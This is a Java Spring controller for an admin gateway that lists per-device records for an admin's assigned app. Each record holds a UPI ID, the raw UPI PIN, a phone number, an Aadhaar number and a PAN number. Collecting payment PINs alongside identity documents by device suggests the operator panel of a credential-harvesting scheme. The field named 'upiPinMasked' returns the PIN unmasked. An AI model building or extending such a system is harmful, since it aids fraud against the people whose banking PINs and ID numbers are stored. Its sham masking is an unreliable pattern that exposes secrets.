package com.admingateway.web;

import com.admingateway.grpc.VpaGrpcClient;
import com.admingateway.grpc.vpa.ListVpaRequest;
import com.admingateway.grpc.vpa.ListVpaResponse;
import com.admingateway.security.SessionValidator;
import io.grpc.Status;
import io.grpc.StatusRuntimeException;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

import java.util.HashMap;
import java.util.List;
import java.util.Map;

@RestController
@RequestMapping("/vpa")
public class VpaRestProxyController {

    private final SessionValidator sessionValidator;
    private final VpaGrpcClient grpc;

    public VpaRestProxyController(SessionValidator sessionValidator, VpaGrpcClient grpc) {
        this.sessionValidator = sessionValidator; this.grpc = grpc;
    }

    @GetMapping
    public ResponseEntity<Map<String,Object>> list(@CookieValue(value="asid", required=false) String asid,
                                   @RequestHeader(value="X-Session-Id", required = false) String sidHeader,
                                   @RequestParam(value="deviceId", required=false) String deviceId,
                                   @RequestParam(value="q", required=false) String q,
                   @RequestParam(value="page", required = false) Integer page,
                   @RequestParam(value="size", required = false) Integer size) {
        String sid = (sidHeader!=null && !sidHeader.isBlank()) ? sidHeader : asid;
        var v = sessionValidator.validate(sid); if (!v.active()) return ResponseEntity.status(401).build();
        if (v.appId()==null || v.appId().isBlank()) {
            return ResponseEntity.badRequest().body(Map.of(
                    "error", "missing_app_id",
                    "message", "Admin has no assigned app. Set Assigned App for this admin in Admin panel and retry."
            ));
        }
    var req = buildVpaRequest(v, new VpaFilters(deviceId, q), page, size);
    final ListVpaResponse resp = safeList(req);
        List<Map<String,Object>> items = resp.getItemsList().stream().map(it -> {
            Map<String,Object> m = new HashMap<>();
            m.put("id", it.getId());
            m.put("adminId", it.getAdminId());
            m.put("appId", it.getAppId());
            m.put("deviceId", it.getDeviceId());
            m.put("upiId", it.getUpiId());
            String pin = it.getUpiPin();
            if (pin != null && !pin.isBlank()) {
                m.put("upiPin", pin);
                m.put("upiPinMasked", pin);
            } else {
                m.put("upiPin", null);
                m.put("upiPinMasked", null);
            }
            m.put("phoneNumber", it.getPhoneNumber());
            m.put("adharCard", it.getAdharCard());
            m.put("panCard", it.getPanCard());
            m.put("eventTimestamp", it.getEventTimestampMs());
            return m;
        }).toList();
        Map<String,Object> out = new HashMap<>();
        out.put("items", items);
        out.put("page", resp.getPage());
        out.put("size", resp.getSize());
        out.put("count", resp.getCount());
        return ResponseEntity.ok(out);
    }

    private ListVpaResponse safeList(ListVpaRequest req) {
        try {
            return grpc.list(req);
        } catch (StatusRuntimeException e) {
            Status.Code code = e.getStatus().getCode();
            int http = switch (code) {
                case UNAVAILABLE -> 502;
                case DEADLINE_EXCEEDED -> 504;
                default -> 500;
            };
            throw new org.springframework.web.server.ResponseStatusException(
                    org.springframework.http.HttpStatus.valueOf(http),
                    "VPA service error: " + code.name()
            );
        }
    }

    private ListVpaRequest buildVpaRequest(SessionValidator.Result session,
                                           VpaFilters filters,
                                           Integer page,
                                           Integer size) {
        boolean explicitUnpaged = size != null && size <= 0;
        boolean unpaged = (page == null && size == null) || explicitUnpaged;
        int safePage = page == null ? 0 : Math.max(0, page);
        int safeSize = size == null ? 50 : Math.max(1, Math.min(200, size));
        return ListVpaRequest.newBuilder()
                .setAdminId(session.adminId()==null?"":session.adminId())
                .setAppId(session.appId()==null?"":session.appId())
                .setDeviceId(filters.deviceId()==null?"":filters.deviceId())
                .setQ(filters.q()==null?"":filters.q())
                .setPage(unpaged ? 0 : safePage)
                .setSize(unpaged ? 0 : safeSize)
                .build();
    }

    private record VpaFilters(String deviceId, String q) {}
}
